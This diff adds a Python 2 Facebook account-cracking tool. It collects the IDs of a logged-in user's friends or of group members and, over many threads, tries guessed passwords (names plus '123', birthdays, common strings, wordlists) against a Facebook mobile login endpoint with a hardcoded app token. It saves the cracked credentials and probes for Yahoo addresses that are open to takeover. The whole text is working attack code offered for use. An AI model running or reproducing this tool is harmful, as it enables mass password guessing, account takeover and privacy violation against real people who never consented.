+											print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+											print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+											print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
+											raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+											menu_hack()
+										else:
+											if 'www.facebook.com' in y["error_msg"]:
+												print "\033[1;91m[+] \033[1;92mFound"
+												print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+												print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+												print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+												print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
+												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+												menu_hack()
+											else:
+												pz6 = "oiboy123"
+												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+												y = json.load(data)
+												if 'access_token' in y:
+													print "\033[1;91m[+] \033[1;92mFound"
+													print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+													print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+													print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
+													raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+													menu_hack()
+												else:
+													if 'www.facebook.com' in y["error_msg"]:
+														print "\033[1;91m[+] \033[1;92mFound"
+														print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+														print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+														print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+														print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
+														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+														menu_hack()
+													else:
+														pz7 = "sayang123"
+														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+														y = json.load(data)
+														if 'access_token' in y:
+															print "\033[1;91m[+] \033[1;92mFound"
+															print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+															print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+															print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
+															raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+															menu_hack()
+														else:
+															if 'www.facebook.com' in y["error_msg"]:
+																print "\033[1;91m[+] \033[1;92mFound"
+																print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+																print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+																print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
+																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+																menu_hack()
+															else:
+																print "\033[1;91m[!] Sorry, failed to open the target password :("
+																print "\033[1;91m[!] try it another way."
+																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+																menu_hack()
+	except KeyError:
+		print "\033[1;91m[!] Terget not found"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_hack()
+										
+								
+##### Multi Brute Force #####
+##### CRACK ####
+def crack():
+	global idlist,passw,file
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')
+	passw = raw_input('\033[1;91m[+] \033[1;92mPassword \033[1;91m: \033[1;97m')
+	try:
+		file = open((idlist), "r")
+		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+		for x in range(40):
+			zedd = threading.Thread(target=scrak, args=())
+			zedd.start()
+			threads.append(zedd)
+		for zedd in threads:
+			zedd.join()
+	except IOError:
+		print ("\033[1;91m[!] File not found")
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_hack()
+		
+def scrak():
+	global berhasil,cekpoint,gagal,back,up
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	try:
+		buka = open(idlist, "r")
+		up = buka.read().split()
+		while file:
+			username = file.readline().strip()
+			url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(passw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
+			data = urllib.urlopen(url)
+			mpsh = json.load(data)
+			if back == (len(up)):
+				break
+			if 'access_token' in mpsh:
+				bisa = open("out/mbf_ok.txt", "w")
+				bisa.write(username+"|"+passw+"\n")
+				bisa.close()
+				x = requests.get("https://graph.facebook.com/"+username+"?access_token="+mpsh['access_token'])
+				z = json.loads(x.text)
+				berhasil.append("\033[1;97m[ \033[1;92mOK✓\033[1;97m ] "+username+"|" +passw+" =>"+z['name'])
+			elif 'www.facebook.com' in mpsh["error_msg"]:
+				cek = open("out/mbf_cp.txt", "w")
+				cek.write(username+"|"+passw+"\n")
+				cek.close()
+				cekpoint.append("\033[1;97m[ \033[1;93mCP✚\033[1;97m ] "+username+"|" +passw)
+			else:
+				gagal.append(username)
+				back +=1
+			sys.stdout.write('\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack    \033[1;91m:\033[1;97m '+str(back)+' \033[1;96m>\033[1;97m '+str(len(up))+' =>\033[1;92mLive\033[1;91m:\033[1;96m'+str(len(berhasil))+' \033[1;97m=>\033[1;93mCheck\033[1;91m:\033[1;96m'+str(len(cekpoint)));sys.stdout.flush()
+	except IOError:
+		print"\n\033[1;91m[!] Sleep"
+		time.sleep(1)
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[✖] No connection"
+		
+def hasil():
+	print
+	print 42*"\033[1;97m═"
+	###Berhasil
+	for b in berhasil:
+		print(b)
+	###CEK
+	for c in cekpoint:
+		print(c)
+	###Gagal
+	print 42*"\033[1;97m═"
+	print ("\033[31m[x] Failed \033[1;97m--> " + str(len(gagal)))
+	keluar()
+	
+############### SUPER MBF ################
+def super():
+	global toket
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print "\033[1;95m║--\033[1;91m> \033[1;96m1.\033[1;93m Crack with list friend"
+	print "\033[1;95m║--\033[1;91m> \033[1;96m2.\033[1;93m Crack from friend"
+	print "\033[1;95m║--\033[1;91m> \033[1;96m3.\033[1;93m Crack from member group"
+	print "\033[1;95m║--\033[1;91m> \033[1;96m0.\033[1;93m Back"
+	print "║"
+	pilih_super()
+
+def pilih_super():
+	peak = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	if peak =="":
+		print "\033[1;91m[!] Wrong input"
+		pilih_super()
+	elif peak =="1":
+		os.system('reset')
+		print logo
+		jalan('\033[1;94m[✺] \033[1;96mGet all friend id \033[1;95m...')
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+	elif peak =="2":
+		os.system('reset')
+		print logo
+		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
+		except KeyError:
+			print"\033[1;91m[!] Friend not found"
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			super()
+		jalan('\033[1;91m[✺] \033[1;92mGet all id from friend \033[1;97m...')
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif peak =="3":
+		os.system('reset')
+		print logo
+		idg=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
+		try:
+			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
+			asw=json.loads(r.text)
+			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+		except KeyError:
+			print"\033[1;91m[!] Group not found"
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			super()
+		jalan('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
+		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
+		s=json.loads(re.text)
+		for p in s['data']:
+			id.append(p['id'])
+	elif peak =="0":
+		menu_hack()
+	else:
+		print "\033[1;91m[!] Wrong input"
+		pilih_super()
+		
+	print "\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
+	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+	print
+	print 42*"\033[1;97m═"
+	
+			
+	##### crack #####
+	def main(arg):
+		global cekpoint,oks
+		user = arg
+		try:
+			os.mkdir('out')
+		except OSError:
+			pass
+		try:
+			#Pass1
+			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			b = json.loads(a.text)
+			pass1 = b['first_name']+'123'
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			q = json.load(data)
+			if 'access_token' in q:
+				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				z = json.loads(x.text)
+				print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass1+" =>"+z['name'])
+				oks.append(user+pass1)
+			else:
+				if 'www.facebook.com' in q["error_msg"]:
+					cek = open("out/super_cp.txt", "a")
+					cek.write(user+"|"+pass1+"\n")
+					cek.close()
+					cekpoint.append(user+pass1)
+				else:
+					#Pass2
+					pass2 = b['first_name']+'12345'
+					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+					q = json.load(data)
+					if 'access_token' in q:
+						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+						z = json.loads(x.text)
+						print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass2+" =>"+z['name'])
+						oks.append(user+pass2)
+					else:
+						if 'www.facebook.com' in q["error_msg"]:
+							cek = open("out/super_cp.txt", "a")
+							cek.write(user+"|"+pass2+"\n")
+							cek.close()
+							cekpoint.append(user+pass2)
+						else:
+							#Pass3
+							pass3 = b['last_name'] + '123'
+							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							q = json.load(data)
+							if 'access_token' in q:
+								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+								z = json.loads(x.text)
+								print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass3+" =>"+z['name'])
+								oks.append(user+pass3)
+							else:
+								if 'www.facebook.com' in q["error_msg"]:
+									cek = open("out/super_cp.txt", "a")
+									cek.write(user+"|"+pass3+"\n")
+									cek.close()
+									cekpoint.append(user+pass3)
+								else:
+									#Pass4
+									lahir = b['birthday']
+									pass4 = lahir.replace('/', '')
+									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									q = json.load(data)
+									if 'access_token' in q:
+										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+										z = json.loads(x.text)
+										print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass4+" =>"+z['name'])
+										oks.append(user+pass4)
+									else:
+										if 'www.facebook.com' in q["error_msg"]:
+											cek = open("out/super_cp.txt", "a")
+											cek.write(user+"|"+pass4+"\n")
+											cek.close()
+											cekpoint.append(user+pass4)
+										else:
+											#Pass5
+											pass5 = "sayang123"
+											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+											q = json.load(data)
+											if 'access_token' in q:
+												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+												z = json.loads(x.text)
+												print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass5+" =>"+z['name'])
+												oks.append(user+pass5)
+											else:
+												if 'www.facebook.com' in q["error_msg"]:
+													cek = open("out/super_cp.txt", "a")
+													cek.write(user+"|"+pass5+"\n")
+													cek.close()
+													cekpoint.append(user+pass5)
+												else:
+													#Pass6
+													pass6 = "oiboy123"
+													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+													q = json.load(data)
+													if 'access_token' in q:
+														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+														z = json.loads(x.text)
+														print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass6+" =>"+z['name'])
+														oks.append(user+pass6)
+													else:
+														if 'www.facebook.com' in q["error_msg"]:
+															cek = open("out/super_cp.txt", "a")
+															cek.write(user+"|"+pass6+"\n")
+															cek.close()
+															cekpoint.append(user+pass6)
+														else:
+															#Pass7
+															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+															b = json.loads(a.text)
+															pass7 = b['first_name']+'doraemon321'
+															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+															q = json.load(data)
+															if 'access_token' in q:
+																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+																z = json.loads(x.text)
+																print("\033[1;93m[ \033[1;93mOK✓\033[1;93m ] "+user+" 😁 " +pass7+" =>"+z['name'])
+																oks.append(user+pass7)
+															else:
+																if 'www.facebook.com' in q["error_msg"]:
+																	cek = open("out/super_cp.txt", "a")
+																	cek.write(user+"|"+pass7+"\n")
+																	cek.close()
+																	cekpoint.append(user+pass7)
+																	
+															
+		except:
+			pass
+		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print 42*"\033[1;97m═"
+	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
+	print"\033[1;91m[+] \033[1;92mTotal OK/CP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
+	print("\033[1;91m[+] \033[1;92mCP File saved \033[1;91m: \033[1;97mout/super_cp.txt")
+	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+	super()
+######################################################
+
+##### BRUTE FORCE #####
+def brute():
+	global toket
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	try:
+		email = raw_input("\033[1;91m[+] \033[1;92mID\033[1;97m/\033[1;92mEmail\033[1;97m/\033[1;92mHp \033[1;97mTarget \033[1;91m:\033[1;97m ")
+		passw = raw_input("\033[1;91m[+] \033[1;92mWordlist \033[1;97mext(list.txt) \033[1;91m: \033[1;97m")
+		total = open(passw,"r")
+		total = total.readlines()
+		print 42*"\033[1;97m═"
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTarget \033[1;91m:\033[1;97m "+email
+		print "\033[1;91m[+] \033[1;92mTotal\033[1;96m "+str(len(total))+" \033[1;92mPassword"
+		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+		sandi = open(passw,"r")
+		for pw in sandi:
+			try:
+				pw = pw.replace("\n","")
+				sys.stdout.write("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;91m: \033[1;97m"+pw)
+				sys.stdout.flush()
+				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+				mpsh = json.loads(data.text)
+				if 'access_token' in mpsh:
+					dapat = open("Brute.txt", "w")
+					dapat.write(email+" | "+pw+"\n")
+					dapat.close()
+					print "\n\033[1;91m[+] \033[1;92mFound"
+					print 42*"\033[1;97m═"
+					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
+					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
+					keluar()
+				elif 'www.facebook.com' in mpsh["error_msg"]:
+					ceks = open("Brutecekpoint.txt", "w")
+					ceks.write(email+" | "+pw+"\n")
+					ceks.close()
+					print "\n\033[1;91m[+] \033[1;92mFound"
+					print 42*"\033[1;97m═"
+					print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
+					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
+					keluar()
+			except requests.exceptions.ConnectionError:
+				print"\033[1;91m[!] Connection Error"
+				time.sleep(1)
+	except IOError:
+		print ("\033[1;91m[!] File not found")
+		tanyaw()
+def tanyaw():
+	why = raw_input("\033[1;91m[?] \033[1;92mCreate wordlist ? \033[1;92m[y/n]\033[1;91m:\033[1;97m ")
+	if why =="":
+		print "\033[1;91m[!] Wrong"
+		tanyaw()
+	elif why =="y":
+		wordlist()
+	elif why =="Y":
+		wordlist()
+	elif why =="n":
+		menu_hack()
+	elif why =="N":
+		menu_hack()
+	else:
+		print "\033[1;91m[!] Wrong"
+		tanyaw()
+		
+##### YAHOO CHECKER #####
+#---------------------------------------------------#
+def menu_yahoo():
+	global toket
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('reset')
+	print logo
+	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m With list friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Clone from friend"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Clone from member group"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Using file"
+	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print "║"
+	yahoo_pilih()
+#----pilih
+def yahoo_pilih():
+	go = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	if go =="":
+		print "\033[1;91m[!] Wrong"
+		yahoo_pilih()
+	elif go =="1":
+		yahoofriends()
+	elif go =="2":
+		yahoofromfriends()
+	elif go =="3":
+		yahoomember()
+	elif go =="4":
+		yahoolist()
+	elif go =="0":
+		menu_hack()
+	else:
+		print "\033[1;91m[!] Wrong"
+		yahoo_pilih()
+		
+##### LIST FRIEND #####
+def yahoofriends():
+	global toket
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	os.system('reset')
+	print logo
+	mpsh = []
+	jml = 0
+	jalan('\033[1;91m[✺] \033[1;92mGetting email friend \033[1;97m...')
+	teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
+	kimak = json.loads(teman.text)
+	save = open('out/MailVuln.txt','w')
+	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+	print 42*"\033[1;97m═"
+	for w in kimak['data']:
+		jml +=1
+		mpsh.append(jml)
+		id = w['id']
+		nama = w['name']
+		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
+		z = json.loads(links.text)
+		try:
+			mail = z['email']
+			yahoo = re.compile(r'@.*')
+			otw = yahoo.search(mail).group()
+			if 'yahoo.com' in otw:
+				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+				br._factory.is_html = True
+				br.select_form(nr=0)
+				br["username"] = mail
+				klik = br.submit().read()
+				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
+				try:
+					pek = jok.search(klik).group()
+				except:
+					continue
+				if '"messages.ERROR_INVALID_USERNAME">' in pek:
+					save.write(mail + '\n')
+					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
+					berhasil.append(mail)
+		except KeyError:
+			pass
+	print 42*"\033[1;97m═"
+	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
+	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
+	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/MailVuln.txt"
+	save.close()
+	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+	menu_yahoo()
+
+##### CLONE FROM FRIEND #####
+def yahoofromfriends():
+	global toket
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	os.system('reset')
+	print logo
+	mpsh = []
+	jml = 0
+	idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
+	try:
+		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+		op = json.loads(jok.text)
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
+	except KeyError:
+		print"\033[1;91m[!] Friend not found"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_yahoo()
+	jalan('\033[1;91m[✺] \033[1;92mGetting email from friend \033[1;97m...')
+	teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
+	kimak = json.loads(teman.text)
+	save = open('out/FriendMailVuln.txt','w')
+	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+	print 42*"\033[1;97m═"
+	for w in kimak['data']:
+		jml +=1
+		mpsh.append(jml)
+		id = w['id']
+		nama = w['name']
+		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
+		z = json.loads(links.text)
+		try:
+			mail = z['email']
+			yahoo = re.compile(r'@.*')
+			otw = yahoo.search(mail).group()
+			if 'yahoo.com' in otw:
+				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+				br._factory.is_html = True
+				br.select_form(nr=0)
+				br["username"] = mail
+				klik = br.submit().read()
+				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
+				try:
+					pek = jok.search(klik).group()
+				except:
+					continue
+				if '"messages.ERROR_INVALID_USERNAME">' in pek:
+					save.write(mail + '\n')
+					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
+					berhasil.append(mail)
+		except KeyError:
+			pass
+	print 42*"\033[1;97m═"
+	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
+	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
+	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/FriendMailVuln.txt"
+	save.close()
+	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+	menu_yahoo()
+	
+##### YAHOO MEMBER #####
+def yahoomember():
+	global toket
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	os.system('reset')
+	print logo
+	mpsh = []
+	jml = 0
+	id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
+	try:
+		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
+		asw=json.loads(r.text)
+		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
+	except KeyError:
+		print"\033[1;91m[!] Group not found"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_yahoo()
+	jalan('\033[1;91m[✺] \033[1;92mGetting email from group \033[1;97m...')
+	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
+	kimak = json.loads(teman.text)
+	save = open('out/GrupMailVuln.txt','w')
+	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+	print 42*"\033[1;97m═"
+	for w in kimak['data']:
+		jml +=1
+		mpsh.append(jml)
+		id = w['id']
+		nama = w['name']
+		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
+		z = json.loads(links.text)
+		try:
+			mail = z['email']
+			yahoo = re.compile(r'@.*')
+			otw = yahoo.search(mail).group()
+			if 'yahoo.com' in otw:
+				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+				br._factory.is_html = True
+				br.select_form(nr=0)
+				br["username"] = mail
+				klik = br.submit().read()
+				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
+				try:
+					pek = jok.search(klik).group()
+				except:
+					continue
+				if '"messages.ERROR_INVALID_USERNAME">' in pek:
+					save.write(mail + '\n')
+					print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail+" \033[1;97m=>"+nama)
+					berhasil.append(mail)
+		except KeyError:
+			pass
+	print 42*"\033[1;97m═"
+	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
+	print"\033[1;91m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
+	print"\033[1;91m[+] \033[1;92mFile saved \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
+	save.close()
+	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+	menu_yahoo()
+		
+##### YAHOO FILE #####
+def yahoolist():
+	global toket
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	os.system('reset')
+	print logo
+	files = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m: \033[1;97m")
+	try:
+		total = open(files,"r")
+		mail = total.readlines()
+	except IOError:
+		print"\033[1;91m[!] File not found"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_yahoo()
+	mpsh = []
+	jml = 0
+	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
+	save = open('out/FileMailVuln.txt','w')
+	print 42*"\033[1;97m═"
+	mail = open(files,"r").readlines()
+	for pw in mail:
+		mail = pw.replace("\n","")
+		jml +=1
+		mpsh.append(jml)
+		yahoo = re.compile(r'@.*')
+		otw = yahoo.search(mail).group()
+		if 'yahoo.com' in otw:
